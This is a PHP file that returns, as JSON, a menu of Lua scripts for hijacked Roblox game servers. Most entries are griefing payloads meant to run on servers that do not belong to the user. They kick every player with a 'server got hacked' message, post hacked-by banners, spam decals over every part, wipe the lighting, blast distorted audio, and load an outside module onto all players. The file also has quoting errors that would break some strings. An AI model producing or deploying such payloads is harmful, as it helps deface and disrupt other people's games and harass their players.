<?php
$scriptList = [
    ["name" => "-- Character --"],
    [
        "name" => "R6 All",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            require(8694264081).load(player.Name)
        end"
    ],
    [
        "name" => "RE All",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            player:LoadCharacter()
        end"
    ],
    [
        "name" => "Duck All",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            require(script.R6).load(player.Name)
			wait(1)
			local pchar = player.Character
			if pchar and pchar:FindFirstChild('Torso') then
				local duck = Instance.new('SpecialMesh', pchar.Torso)
				duck.MeshType = 'FileMesh'
				duck.MeshId = 'rbxassetid://9419831'
				duck.TextureId = 'rbxassetid://9419827'
				duck.Scale = Vector3.new(5, 5, 5)
				for _, partName in ipairs({'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg'}) do
					if pchar:FindFirstChild(partName) then
						pchar[partName].Transparency = 1
					end
				end
			end
        end"
    ],
    [
        "name" => "Cake All",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            require(script.R6).load(player.Name)
			wait(1)
			local pchar = player.Character
			if pchar and pchar:FindFirstChild('Torso') then
				local duck = Instance.new('SpecialMesh', pchar.Torso)
				duck.MeshType = 'FileMesh'
				duck.MeshId = 'rbxassetid://1376455'
				duck.TextureId = 'rbxassetid://1376454'
				duck.Scale = Vector3.new(5, 5, 5)
				for _, partName in ipairs({'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg'}) do
					if pchar:FindFirstChild(partName) then
						pchar[partName].Transparency = 1
					end
				end
			end
        end"
    ],
    ["name" => "-- Particles --"],
    [
        "name" => "Fire All",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild('HumanoidRootPart') then
				local fire = Instance.new('Fire', player.Character.HumanoidRootPart)
				fire.Size = 4
			end
        end"
    ],
    [
        "name" => "Smoke All",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild('HumanoidRootPart') then
				local Smoke = Instance.new('Smoke', player.Character.HumanoidRootPart)
                Smoke.Size = 4
			end
        end"
    ],
    [
        "name" => "Sparkle All",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild('HumanoidRootPart') then
				local Sparkle = Instance.new('Sparkle', player.Character.HumanoidRootPart)
				Sparkle.Enabled = true
			end
        end"
    ],
    ["name" => "-- Server --"],
    [
        "name" => "Shutdown Server",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            player:Kick('Game is down for the moment, please rejoin later.')
        end"
    ],
    [
        "name" => "Kick All",
        "lua_code" => "
        for _, player in pairs(game.Players:GetPlayers()) do
            player:Kick('You'r Server got hacked, Thanks to use FuckBlox.com !')
        end"
    ],
    [
        "name" => "Message Server",
        "lua_code" => "
        local msg = Instance.new('Message',workspace)
        msg.Text = 'Hi, We are W00lin3 and this server is hacked by us.'
        wait(5)
        msg:Destroy()
        "
    ],
    [
        "name" => "Hint Server",
        "lua_code" => "
        local HT = Instance.new('Hint',workspace)
        HT.Text = 'Roblox isn't for kid these day, Play minecraft or something else..'
        "
    ],
    [
        "name" => "Our Song",
        "lua_code" => "
        local songID = target ~= "" and target or 0
		local song = Instance.new('Sound',workspace)
		local Chaos = Instance.new('DistortionSoundEffect',song)
        Chaos.Level = 0.75
		song.Volume = 4.5
		song.SoundId = 'rbxassetid://5410086218'
		song:Play()"
    ],
    [
        "name" => "Our DecalSpam",
        "lua_code" => "
        local ID = 000
        for i,v in pairs (game.Workspace:GetChildren()) do
			if v:IsA('Part') then
				local decal1 =Instance.new('Decal')
				local decal2 =Instance.new('Decal')
				local decal3 =Instance.new('Decal')
				local decal4 =Instance.new('Decal')
				local decal5 =Instance.new('Decal')
				local decal6 =Instance.new('Decal')
				decal1.Texture = 'http://www.roblox.com/asset/?id=' ..ID
				decal2.Texture = 'http://www.roblox.com/asset/?id=' ..ID
				decal3.Texture = 'http://www.roblox.com/asset/?id=' ..ID
				decal4.Texture = 'http://www.roblox.com/asset/?id=' ..ID
				decal5.Texture = 'http://www.roblox.com/asset/?id=' ..ID
				decal6.Texture = 'http://www.roblox.com/asset/?id=' ..ID
				decal1.Parent = v
				decal2.Parent = v
				decal3.Parent = v
				decal4.Parent = v
				decal5.Parent = v
				decal6.Parent = v
				decal1.Face = 'Front'
				decal2.Face = 'Top'
				decal3.Face = 'Left'
				decal4.Face = 'Right'
				decal5.Face = 'Bottom'
				decal6.Face = 'Back'
			end
		end
		for i,v in pairs (game.Workspace:GetChildren()) do
			if v:IsA('Model') then
				for i,z in pairs (v:GetChildren()) do
					if z:IsA('Part') then
						local decal7 =Instance.new('Decal')
						local decal8 =Instance.new('Decal')
						local decal9 =Instance.new('Decal')
						local decal10 =Instance.new('Decal')
						local decal11 =Instance.new('Decal')
						local decal12 =Instance.new('Decal')
						decal7.Texture = 'http://www.roblox.com/asset/?id=' ..ID
						decal8.Texture = 'http://www.roblox.com/asset/?id=' ..ID
						decal9.Texture = 'http://www.roblox.com/asset/?id='..ID
						decal10.Texture = 'http://www.roblox.com/asset/?id=' ..ID
						decal11.Texture = 'http://www.roblox.com/asset/?id=' ..ID
						decal12.Texture = 'http://www.roblox.com/asset/?id=' ..ID
						decal7.Parent = z
						decal8.Parent = z
						decal9.Parent = z
						decal10.Parent = z
						decal11.Parent = z
						decal12.Parent = z
						decal7.Face = 'Front'
						decal8.Face = 'Top'
						decal9.Face = 'Left'
						decal10.Face = 'Right'
						decal11.Face = 'Bottom'
						decal12.Face = 'Back'
					end
				end
			end
		end	 
        "
    ],
    [
        "name" => "Our Sky",
        "lua_code" => "
        local Lighting = game:GetService('Lighting')
		for _, v in ipairs(Lighting:GetChildren()) do
			v:Destroy()
		end
		wait(1)
		local s = Instance.new('Sky')
		s.Name = 'Sky'
		s.Parent = Lighting
		s.SkyboxBk = 'rbxassetid://'
		s.SkyboxDn = 'rbxassetid://'
		s.SkyboxFt = 'rbxassetid://'
		s.SkyboxLf = 'rbxassetid://'
		s.SkyboxRt = 'rbxassetid://'
		s.SkyboxUp = 'rbxassetid://'"
    ],
];

header('Content-Type: application/json');
echo json_encode($scriptList, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
?>
